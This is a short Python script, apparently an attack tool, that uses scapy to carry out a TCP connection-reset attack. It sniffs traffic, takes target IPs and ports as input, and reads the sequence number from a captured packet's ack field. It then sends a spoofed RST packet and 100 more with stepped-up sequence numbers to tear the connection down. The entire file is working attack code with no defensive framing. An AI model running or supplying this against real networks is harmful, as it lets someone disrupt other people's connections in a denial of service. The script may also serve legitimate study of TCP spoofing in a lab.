__author__ = 'Samer Hanna'

from scapy.all import *

conf.use_pcap = True

def findSeqNum(pkt):
	global seq_num
	seq_num = pkt[TCP].ack


#Sniffing network
capture = sniff(count=25)
capture.summary()

#Setting the values that will be used in the spoofed packet
ip_src = input("[*] Enter source ip: ")
ip_dst = input("[*] Enter destination ip: ")
port_src = int(input("[*] Enter source port: "))
port_dst = int(input("[*] Enter destination port: "))

#Sniffing a packet sent from dst to src, in order to get seq_num from the packet's ack
cap_filter = "dst host " + ip_src + " and dst port " + str(port_src)
pkt = sniff(filter=cap_filter, count=1, prn=findSeqNum)

#Crafting and sending the reset packet
print("[+] Sending the spoofed tcp packet with sequence number = ", seq_num)
IP_layer = IP(src=ip_src, dst=ip_dst)
TCP_layer = TCP(sport=port_src, dport=port_dst, flags="R", seq=seq_num)
pkt = IP_layer/TCP_layer
ls(pkt)
send(pkt)

#Sending more packets in case we were too late regarding seq_num
print("[+] Sending more packets with higher sequence numbers...")
for i in range(0,1000,10):
	TCP_layer = TCP(sport=port_src, dport=port_dst, flags="R", seq=seq_num+i)
	pkt = IP_layer/TCP_layer
	send(pkt, verbose=0)

